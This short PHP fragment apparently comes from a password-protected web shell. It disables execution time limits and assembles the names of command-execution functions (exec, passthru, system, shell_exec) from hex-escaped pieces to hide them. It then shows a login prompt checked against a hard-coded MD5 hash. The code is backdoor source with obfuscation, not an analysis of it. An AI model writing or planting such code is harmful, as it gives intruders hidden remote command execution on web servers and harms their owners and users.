...
if(!function_exists('ini_set')){function ini_set(){return FALSE;}}
ini_set('output_buffering',0);
if(@set_time_limit(0) || ini_set('max_execution_time', 0)) $limit = 'not limited';
else $limit = get_cfg_var('max_execution_time');
$FF = "e\x78"."\x65c\x70ass"."thr";
if(isset($HTTP_SERVER_VARS) && !isset($_SERVER)){$_POST = &$HTTP_POST_VARS;$_GET = &$HTTP_GET_VARS;$_SERVER = &$HTTP_SERVER_VARS;}
$FF = $FF."u\x73ys"."t\x65m\x73h"."\x65ll_\x65x"."\x65c";
...
if (empty($sdk) || md5($sdk)!=='3bf9ce608686c040f99f1083a3d2b044')
{
print<<<here
<tr>
<td align=center>
<input type=text name=sdk size=16 value="{$sdk}">
</td>
</tr>
</table>
here;
